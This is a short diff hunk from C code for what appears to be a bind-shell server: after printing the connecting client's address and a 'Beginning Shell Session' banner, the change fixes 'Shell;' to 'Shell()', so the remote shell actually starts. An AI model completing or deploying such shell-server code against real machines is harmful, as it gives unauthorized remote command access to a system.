@@ -111,7 +111,7 @@ int Server() {
 
     printf("    [>>] Connection From %s!\n", inet_ntoa(cli_addr.sin_addr));
     printf("    [>>] Beggining Shell Session !\n");
-    Shell;
+    Shell();
     return 0;
 }
 
